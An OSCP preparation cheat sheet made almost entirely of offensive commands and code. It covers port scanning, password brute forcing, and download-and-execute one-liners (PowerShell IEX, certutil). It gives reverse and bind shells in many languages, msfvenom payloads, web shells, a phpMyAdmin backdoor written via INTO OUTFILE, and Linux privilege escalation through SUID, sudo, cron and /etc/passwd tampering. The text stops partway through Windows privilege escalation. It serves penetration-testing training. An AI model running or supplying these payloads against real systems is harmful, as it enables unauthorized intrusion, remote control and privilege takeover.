# Ultimate OSCP Cheat Sheet & Walkthrough

> **The complete reference guide for OSCP preparation - commands, techniques, and methodology for PWK labs and exam**

---

## Table of Contents

1. [Reconnaissance & Enumeration](#1-reconnaissance--enumeration)
2. [Brute Force Attacks](#2-brute-force-attacks)
3. [File Transfer Methods](#3-file-transfer-methods)
4. [Shells & Payloads](#4-shells--payloads)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Lateral Movement & Pivoting](#7-lateral-movement--pivoting)
8. [Active Directory](#8-active-directory)
9. [Web Application Attacks](#9-web-application-attacks)
10. [Password Cracking](#10-password-cracking)
11. [Miscellaneous Utilities](#11-miscellaneous-utilities)
12. [Exam-Day Checklist](#12-exam-day-checklist)

---

## 1. Reconnaissance & Enumeration

### 1.1 AutoRecon (Automated Reconnaissance)

```bash
# Install
sudo apt install autorecon

# Basic usage
autorecon -vv 192.168.0.1

# Multiple targets
autorecon -vv 192.168.0.1 192.168.0.2

# Target file
autorecon -vv targets.txt
```

---

### 1.2 Nmap Cheat Sheet

#### Initial Fast TCP Scan (1000 ports)
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
```

**Flags Explained**:
| Flag | Purpose |
|------|---------|
| `-v` | Verbose output |
| `-sS` | SYN stealth scan |
| `-sV` | Service/version detection |
| `-Pn` | Skip host discovery (treat all hosts as online) |
| `--top-ports 1000` | Most common 1000 ports |
| `-oA` | Output all formats (XML, grepable, normal) |

#### Full TCP Scan (All 65535 ports)
```bash
nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
```

#### Limited Full TCP Scan (Fast alternative)
```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
```

**Flags**:
| Flag | Purpose |
|------|---------|
| `-sT` | TCP Connect scan (no root required) |
| `-p-` | All ports |
| `--min-rate 5000` | Minimum 5000 packets/sec |
| `--max-retries 1` | Don't retry failed probes |

#### Top 100 UDP Scan
```bash
nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
```

#### Full Vulnerability Scan (NSE)
```bash
nmap -v -sS -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

#### Vulners Vulnerability Script (CVE mapping)
```bash
nmap -v -sS -Pn --script nmap-vulners -oA vulners_scan_192.168.0.1 192.168.0.1
```

#### SMB Vulnerability Scan
```bash
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.0.1 192.168.0.1
```

#### Common Nmap Scenarios

| Scenario | Command |
|----------|---------|
| Quick internal scan | `nmap -sn 192.168.0.0/24` |
| OS detection | `nmap -O 192.168.0.1` |
| Specific ports | `nmap -p 80,443,445 192.168.0.1` |
| Output to file | `nmap -oN output.txt 192.168.0.1` |
| IPv6 scan | `nmap -6 2001:db8::1` |

---

### 1.3 Gobuster (Web Directory Brute Force)

#### HTTP Directory Enumeration

**Fast Scan (Small List)**:
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```

**Fast Scan (Medium List)**:
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

**Slow Scan (Check File Extensions)**:
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx,jsp,do -t 20
```

**HTTPS Scan**:
```bash
gobuster dir -e -u https://192.168.0.1 -w /usr/share/wordlists/dirb/common.txt --insecure
```

**DNS Subdomain Brute Force**:
```bash
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

**VHost Brute Force**:
```bash
gobuster vhost -u http://192.168.0.1 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

#### Gobuster Flags Reference

| Flag | Purpose |
|------|---------|
| `-u` | Target URL |
| `-w` | Wordlist path |
| `-t` | Number of threads |
| `-e` | Show full URLs |
| `-x` | File extensions to check |
| `--insecure` | Skip SSL verification |
| `-s` | Status codes to include |
| `-b` | Status codes to exclude |

---

### 1.4 SMB Enumeration

#### Fix SMB Connection Errors (New Kali)
```
# Add to /etc/samba/smb.conf
client min protocol = NT1
```

#### Basic SMB Enumeration

**List Shares (as Guest)**:
```bash
smbclient -U guest -L 192.168.0.1
```

**List Shares (as User)**:
```bash
smbclient -U "John" -L 192.168.0.1
```

**Connect to a Share**:
```bash
smbclient \\\\192.168.0.1\\Users -U "John" -p "password"
```

**Download All Files Recursively**:
```bash
smbclient '\\192.168.0.1\Data' -U "John" -c 'prompt OFF;recurse ON;cd "\Users\John\";lcd "/tmp/John";mget *'
```

#### Alternate Data Streams (ADS)

**List Streams**:
```bash
smbclient \\\\192.168.0.1\\Data -U "John" -c 'allinfo "\Users\John\file.txt"'
```

**Download Stream by Name**:
```bash
smbclient \\\\192.168.0.1\\Data -U "John"
# Then inside smbclient:
get "\Users\John\file.txt:SECRET:$DATA"
```

**Discover ADS with Powershell**:
```powershell
Get-Item -Path .\file.txt -Stream *
Get-Content -Path .\file.txt -Stream SECRET
```

---

### 1.5 Enum4Linux (SMB Enumeration)

```bash
# Full scan
enum4linux 192.168.0.1

# Suppress errors
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out

# Specific enumeration
enum4linux -U 192.168.0.1   # Users
enum4linux -S 192.168.0.1   # Shares
enum4linux -G 192.168.0.1   # Groups
enum4linux -P 192.168.0.1   # Password policy
enum4linux -o 192.168.0.1   # OS information
```

---

### 1.6 NFS Enumeration

```bash
# Show mountable drives
showmount -e 192.168.0.1

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs -o soft 192.168.0.1:/backup /mnt/nfs

# Mount with specific version
mount -t nfs -o nfsvers=3 192.168.0.1:/home /mnt/nfs

# Unmount
umount /mnt/nfs
```

---

### 1.7 SMTP Enumeration

```bash
# Connect to SMTP
nc -nv 192.168.0.1 25

# VRFY users
VRFY root
VRFY admin
VRFY user

# EXPN (expand mailing list)
EXPN mail

# RCPT TO enumeration
MAIL FROM: test@test.com
RCPT TO: root
RCPT TO: admin

# SMTP user enumeration with Metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.0.1
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
run
```

---

### 1.8 FTP Enumeration

```bash
# Anonymous login
ftp 192.168.0.1
Username: anonymous
Password: anything

# List files
ls
dir

# Download all files
mget *

# With curl
curl -T file.txt ftp://192.168.0.1 --user anonymous:password

# FTP bounce scan
nmap -b anonymous:password@192.168.0.1 -p 21-25 192.168.0.2
```

---

### 1.9 SNMP Enumeration

```bash
# Scan for SNMP
sudo nmap -sU --open -p 161 192.168.0.1-254

# Brute force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.0.1

# Walk SNMP tree
snmpwalk -c public -v1 192.168.0.1

# Enumerate Windows users
snmpwalk -c public -v1 192.168.0.1 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -c public -v1 192.168.0.1 1.3.6.1.2.1.25.4.2.1.2

# Enumerate installed software
snmpwalk -c public -v1 192.168.0.1 1.3.6.1.2.1.25.6.3.1.2
```

**Common SNMP OIDs**:
| OID | Description |
|-----|-------------|
| 1.3.6.1.2.1.25.1.6.0 | System processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running programs |
| 1.3.6.1.4.1.77.1.2.25 | User accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP local ports |
| 1.3.6.1.2.1.25.6.3.1.2 | Software name |

---

### 1.10 DNS Enumeration

```bash
# Forward DNS
host example.com
nslookup example.com
dig example.com

# Reverse DNS
host 192.168.0.1
nslookup 192.168.0.1

# NS records
host -t ns example.com

# MX records
host -t mx example.com

# TXT records
host -t txt example.com

# Zone transfer attempt
host -l example.com ns1.example.com
dig axfr @ns1.example.com example.com

# DNS brute force
dnsenum example.com
dnsrecon -d example.com -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
```

---

### 1.11 SQLMAP

> ⚠️ **WARNING**: sqlmap is RESTRICTED in the OSCP exam! Check current exam guidelines.

#### Get Request
```bash
# Test all (default)
sqlmap -u "http://192.168.0.1/inject.php?q=user" --batch

# Test all (high stress)
sqlmap -u "http://192.168.0.1/inject.php?q=user" --batch --level=5 --risk=3
```

#### Post Request (Capture with Burp)
```bash
# Test all (default)
sqlmap --all -r post_request.txt --batch

# Test all (high stress)
sqlmap --all -r post_request.txt --batch --level=5 --risk=3

# Get reverse shell (MySQL)
sqlmap -r post_request.txt --dbms "mysql" --os-shell

# Dump database
sqlmap -r post_request.txt --dump --batch

# List databases
sqlmap -r post_request.txt --dbs --batch

# List tables
sqlmap -r post_request.txt -D database_name --tables --batch
```

---

## 2. Brute Force Attacks

### 2.1 Hydra

#### HTTP Basic Authentication
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

#### HTTP Get Request
```bash
hydra 192.168.0.1 -V -L users.txt -P rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345" -t 15
```

#### HTTP Post Request
```bash
hydra -l admin -P rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

#### HTTPS Post Form
```bash
hydra -l admin -P rockyou.txt 192.168.0.1 https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 15
```

#### MySQL Brute Force
```bash
hydra -L users.txt -P rockyou.txt -vv mysql://192.168.0.1:3306/mysql -t 15
```

#### SSH Brute Force
```bash
hydra -l root -P rockyou.txt ssh://192.168.0.1 -t 4 -V
```

#### RDP Brute Force
```bash
hydra -L users.txt -P rockyou.txt rdp://192.168.0.1 -t 1 -V
```

#### SMB Brute Force
```bash
hydra -L users.txt -P rockyou.txt smb://192.168.0.1 -t 4 -V
```

---

### 2.2 Medusa (Alternative to Hydra)

```bash
# SSH
medusa -h 192.168.0.1 -U users.txt -P rockyou.txt -M ssh -t 4

# HTTP form
medusa -h 192.168.0.1 -U users.txt -P rockyou.txt -M web-form -m FORM:/login.php:user:pass:LoginFailed
```

---

### 2.3 Kerbrute (Kerberos)

```bash
# User enumeration
kerbrute userenum -d domain.com --dc 192.168.0.1 users.txt

# Password spray
kerbrute passwordspray -d domain.com --dc 192.168.0.1 users.txt "Password123!"

# Brute force
kerbrute bruteuser -d domain.com --dc 192.168.0.1 rockyou.txt user
```

---

### 2.4 CrackMapExec (Password Spraying)

```bash
# SMB password spray
crackmapexec smb 192.168.0.1 -u users.txt -p passwords.txt --continue-on-success

# Local admin check
crackmapexec smb 192.168.0.1 -u user -p password --local-auth

# List shares
crackmapexec smb 192.168.0.1 -u user -p password --shares

# Execute command
crackmapexec smb 192.168.0.1 -u user -p password -x whoami
```

---

## 3. File Transfer Methods

### 3.1 PowerShell (Windows)

#### Basic Download
```powershell
# As cmd.exe command
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1/shell.exe','C:\Users\Public\shell.exe')
```

#### Encode Command (Handle Special Characters)
```powershell
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1/tool.exe","C:\Windows\Temp\tool.exe")'
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Command))
powershell.exe -NoProfile -encoded $Encoded
```

#### DownloadString and Execute
```powershell
# Download and execute script
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/script.ps1')

# One-liner
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/script.ps1')"

# With bypass
powershell -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/script.ps1')"
```

#### Invoke-WebRequest (iwr)
```powershell
iwr -Uri http://192.168.0.1/tool.exe -OutFile C:\Windows\Temp\tool.exe
```

---

### 3.2 Certutil (Windows)

```bash
certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
```

**URL Cache Example**:
```bash
certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe shell.exe
```

**Python Download & Execute**:
```python
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\\Windows\\Temp\\shell.exe & C:\\Windows\\Temp\\shell.exe')
```

---

### 3.3 SMB (Windows to Kali)

#### Start Impacket SMB Server
```bash
impacket-smbserver -smb2support share /var/www/html
```

#### Start SMB Server with Credentials
```bash
impacket-smbserver -smb2support -username user -password pass share /var/www/html
```

#### Windows Commands (Victim)
```cmd
# List shares
net view \\192.168.0.1

# Copy file
copy \\192.168.0.1\share\shell.exe shell.exe

# Execute from share
\\192.168.0.1\share\shell.exe
```

---

### 3.4 Pure-FTPD

#### Install
```bash
apt-get update && apt-get install pure-ftpd
```

#### Setup Script
```bash
# setupftp.sh
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDB
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

chmod +x setupftp.sh
./setupftp.sh
```

#### Service Management
```bash
# Reset password
pure-pw passwd offsec

# Commit changes
pure-pw mkdb

# Restart service
/etc/init.d/pure-ftpd restart
```

#### FTP Script (Victim)
```bash
# Create ftp.txt
echo open 192.168.0.1 >> ftp.txt
echo USER myftpuser >> ftp.txt
echo mypassword >> ftp.txt
echo bin >> ftp.txt
echo put secret_data.txt >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

---

### 3.5 Netcat File Transfer

#### Receive File (Listener)
```bash
nc -l -p 1234 > received_file
```

#### Send File (Victim)
```bash
nc -w 3 192.168.0.1 1234 < file_to_send
```

---

### 3.6 TFTP

#### Start TFTP Daemon
```bash
atftpd --daemon --port 69 /var/tftp
```

#### Transfer from Windows
```cmd
tftp -i 192.168.0.1 GET shell.exe
tftp -i 192.168.0.1 PUT file.txt
```

---

### 3.7 VBScript

#### Create wget.vbs
```vbscript
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts
Err.Clear
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET",strURL,False
http.Send
varByteArray = http.ResponseBody
Set http = Nothing
Set fs = CreateObject("Scripting.FileSystemObject")
Set ts = fs.CreateTextFile(StrFile,True)
strData = ""
strBuffer = ""
For lngCounter = 0 to UBound(varByteArray)
    ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1)))
Next
ts.Close
```

#### Download Files
```cmd
cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
```

---

### 3.8 Linux File Transfer

#### wget
```bash
wget http://192.168.0.1/file.txt
wget -O output.txt http://192.168.0.1/file.txt
```

#### curl
```bash
curl -o file.txt http://192.168.0.1/file.txt
curl http://192.168.0.1/file.txt > file.txt
```

#### scp
```bash
scp user@192.168.0.1:/remote/file /local/path
scp /local/file user@192.168.0.1:/remote/path
```

#### rsync
```bash
rsync -av user@192.168.0.1:/remote/dir/ /local/dir/
rsync -av /local/dir/ user@192.168.0.1:/remote/dir/
```

#### Base64 Encoding
```bash
# Encode file
base64 -w0 file.bin > file.b64

# Decode on target
echo "base64_string" | base64 -d > file.bin
```

---

### 3.9 Python HTTP Server (Kali)

```bash
# Simple HTTP server
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# With directory
cd /path/to/share && python3 -m http.server 80
```

---

## 4. Shells & Payloads

### 4.1 Upgrade Shell (TTY)

```bash
# Basic TTY
python -c 'import pty;pty.spawn("/bin/bash");'

# Full TTY
python -c 'import pty;pty.spawn("/bin/bash");'
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color

# Alternative with script
script /dev/null -c bash
```

### 4.2 Netcat Shells

#### Reverse Shell

**Linux Victim**:
```bash
# Check for nc variants
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc.traditional

# Send
nc 192.168.0.1 4444 -e /bin/bash
```

**Windows Victim**:
```cmd
nc 192.168.0.1 4444 -e cmd.exe
```

**Attacker**:
```bash
rlwrap nc -nlvp 4444
```

#### Bind Shell

**Linux Victim**:
```bash
nc -nlvp 4444 -e /bin/bash
```

**Windows Victim**:
```cmd
nc -nlvp 4444 -e cmd.exe
```

**Attacker**:
```bash
nc 192.168.0.1 4444
```

---

### 4.3 Bash Reverse Shell

```bash
# Standard
/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1

# Without /bin/bash
bash -i >& /dev/tcp/192.168.0.1/4444 0>&1

# With exec
exec /bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1'

# Over HTTP
exec 5<>/dev/tcp/192.168.0.1/4444;cat <&5|while read line;do $line >&5;done
```

---

### 4.4 Python Reverse Shell

#### One-liner
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Python3 Version
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Multi-line Python
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

---

### 4.5 PHP Shells

#### Kali Default PHP Reverse Shell
```bash
# Location
cat /usr/share/webshells/php/php-reverse-shell.php

# Modify IP and port then upload
```

#### PHP CMD Shell
```bash
# Location
cat /usr/share/webshells/php/php-backdoor.php
```

#### Simple PHP Reverse Shells
```php
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>
```
```php
<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2>&3");?>
```

#### PHP CMD Shell (Web)
```php
<?php echo system($_REQUEST["cmd"]); ?>
```
**Access**: `http://192.168.0.1/shell.php?cmd=whoami`

#### WhiteWinterWolf Webshell
```
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
```

---

### 4.6 Perl Reverse Shell

```bash
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

### 4.7 Ruby Reverse Shell

```bash
ruby -rsocket -e 'f=TCPSocket.open("192.168.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

### 4.8 Node.js Reverse Shell

```javascript
// One-liner
require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"')

// Full version
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

### 4.9 Java Shells

#### JSP Reverse Shell
```jsp
<%
    Process p = Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1'");
    p.waitFor();
%>
```

#### Jenkins/Groovy Reverse Shell
```groovy
// Linux
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

```groovy
// Windows
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

---

### 4.10 MSFVENOM Payloads

#### Windows Binary (.exe)

**32-bit (x86)**:
```bash
# Reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

# Bind shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Meterpreter
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

# Custom (bad chars, exit function)
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

**64-bit (x64)**:
```bash
# Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

# Bind shell
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

#### Linux Binary (.elf)

**32-bit (x86)**:
```bash
# Reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

# Bind shell
msfvenom -p linux/x86/shell/bind_tcp LHOST=192.168.0.1 -f elf > bind_shell.elf
```

**64-bit (x64)**:
```bash
# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

# Meterpreter
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > shell.elf
```

#### Web Shells

**JSP**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

**ASPX**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

**ASP**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f asp -o shell.asp
```

**PHP**:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f raw -o shell.php
```

**Python**:
```bash
msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f raw -o shell.py
```

#### MacOS
```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f macho -o shell.macho
```

#### Android
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -o shell.apk
```

---

### 4.11 ASPX Shells for Web Upload

#### Download File (Certutil)
```aspx
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

#### Execute File
```aspx
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

---

### 4.12 PHPMyAdmin Shell Upload

**Windows**:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php"
```

**Linux**:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
```

**Usage**:
```
http://192.168.0.1/shell.php?cmd=whoami
```

---

## 5. Privilege Escalation

### 5.1 Linux Privilege Escalation

#### Quick Enumeration
```bash
# Current user
id
whoami
groups

# System info
uname -a
cat /etc/issue
cat /etc/os-release

# Users
cat /etc/passwd
cat /etc/shadow (requires root)

# Sudo permissions
sudo -l

# SUID files
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
ls -la /etc/cron*
crontab -l
cat /etc/crontab

# Writable files
find / -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Running processes
ps auxf
ps -eo pid,user,command

# Network
ip a
netstat -tulpn
ss -tulpn

# Installed packages
dpkg -l (Debian)
rpm -qa (RedHat)
```

#### linPEAS (Automated)
```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Run
chmod +x linpeas.sh
./linpeas.sh
```

#### Common Linux PrivEsc Vectors

**SUID Binaries**:
```bash
# Find SUID
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for specific binaries
# Example: find
find . -exec /bin/sh -p \; -quit

# Example: bash
bash -p

# Example: python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Capabilities**:
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash");'
```

**Sudo Misconfigurations**:
```bash
# Check sudo -l
sudo -l

# Exploit GTFObins
# Example: less
sudo less /etc/hosts
!/bin/bash

# Example: vim
sudo vim
:!/bin/bash

# Example: git
sudo git help config
!/bin/bash
```

**Cron Jobs**:
```bash
# Find writable cron scripts
find /etc/cron* -writable 2>/dev/null

# Check script permissions
ls -la /path/to/script.sh

# Add reverse shell if writable
echo 'bash -c "bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"' >> /path/to/script.sh
```

**/etc/passwd Writeable**:
```bash
# Generate password
openssl passwd w00t
# Output: Fdzt.eqJQ4s0g

# Add new root user
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch user
su root2
# Password: w00t
```

**Dirty Pipe (CVE-2022-0847)**:
```bash
# Check kernel version (5.8+)
uname -r

# Download exploit
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit
gcc exploit.c -o exploit
./exploit
```

---

### 5.2 Windows Privilege Escalation

#### Quick Enumeration

**System Info**:
```cmd
systeminfo
hostname
whoami
whoami /all
whoami /priv

# OS version
wmic os get Caption,Version,CSName,OSArchitecture

# Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**User Info**:
```cmd
net user
net user username
net localgroup
net localgroup Administrators

# PowerShell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

**Network**:
```cmd
ipconfig /all
route print
netstat -ano
arp -a
```

**Running Processes**:
```cmd
tasklist /v
tasklist /svc
wmic process list brief
```

**Installed Software**:
```cmd
wmic product get name,version,vendor
wmic service list brief
```

**Services**:
```cmd
sc query
sc query state= all
sc qc servicename
```

**Scheduled Tasks**:
```cmd
schtasks /query /fo LIST /v
```

**Firewall**:
```cmd
netsh firewall show state
netsh advfirewall show allprofiles
```

#### winPEAS (Automated)
```cmd
# Download
iwr -uri http://192.168.0.1/winPEASx64.exe -Outfile winPEAS.exe

# Run
winPEAS.exe
```

#### PowerUp (PowerShell)
```powershell
# Download
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Import
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
```

#### Windows PrivEsc Vectors

**Unquoted Service Paths**:
```cmd
# Find unquoted services
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Exploit
# Place malicious .exe in writable path component
```

**Service Binary Hijacking**:
```cmd
# Check permissions
icacls "C:\Path\to\service.exe"

# If writable, replace with malicious binary
# Restart service or reboot
```

